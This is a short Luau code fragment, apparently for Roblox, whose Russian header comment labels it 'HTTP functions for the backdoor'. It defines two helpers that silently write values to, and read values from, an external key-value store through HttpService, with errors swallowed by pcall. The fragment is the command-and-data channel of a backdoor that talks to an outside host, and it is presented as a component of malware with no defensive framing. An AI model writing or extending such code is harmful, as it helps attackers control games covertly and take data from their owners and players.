-- ==============================================
-- HTTP ФУНКЦИИ ДЛЯ БЕКДОРА
-- ==============================================
local function dbSet(key, value, ttl)
    pcall(function()
        HS:RequestAsync({
            Url = DB_BASE .. key,
            Method = "POST",
            Headers = { ["Content-Type"] = "text/plain", ["X-Expire"] = tostring(ttl or DB_TTL) },
            Body = tostring(value)
        })
    end)
end

local function dbGet(key)
    local ok, res = pcall(function() return HS:GetAsync(DB_BASE .. key, true) end)
    return ok and res or nil
end

